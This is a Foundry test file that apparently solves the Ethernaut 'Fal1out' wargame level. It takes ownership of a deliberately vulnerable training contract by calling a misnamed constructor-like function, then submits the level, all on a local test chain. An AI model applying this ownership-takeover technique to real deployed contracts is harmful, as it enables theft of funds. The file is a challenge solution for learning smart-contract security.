// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/Ethernaut.sol";
import "src/02-Fallout/FalloutFactory.sol";

contract BaseSetUp is Test {

    Ethernaut ethernaut;
    address payable attacker;

    function setUp() public virtual {
        // Initialize Ethernaut contract
        ethernaut = new Ethernaut();

        // Initialize Attacker EOA
        attacker = payable(vm.addr(1));      
        vm.deal(attacker, 10 ether);
        vm.label(attacker, "Attacker");
    }
}

contract Attack is BaseSetUp {

    Fallout ethernautFallout;
    address payable levelAddress;

    function setUp() public virtual override {
        BaseSetUp.setUp();

        // Initialize level
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);

        vm.prank(attacker);
        levelAddress = payable(ethernaut.createLevelInstance(falloutFactory));
        ethernautFallout = Fallout(levelAddress);
        console.log("Ethernaut Fal1out Challenge!");
    }

    function testAttack() public {
        
        vm.startPrank(attacker);

        // Take ownership of the contract by calling Fal1out()
        emit log_address(ethernautFallout.owner());
        ethernautFallout.Fal1out{value: 0.1 ether}();
        address newOwner = ethernautFallout.owner();
        emit log_address(newOwner);
        assert(newOwner == attacker);

        // Submit Level
        bool passedLevel = ethernaut.submitLevelInstance(levelAddress);
        assert(passedLevel);

        vm.stopPrank();
    }
}

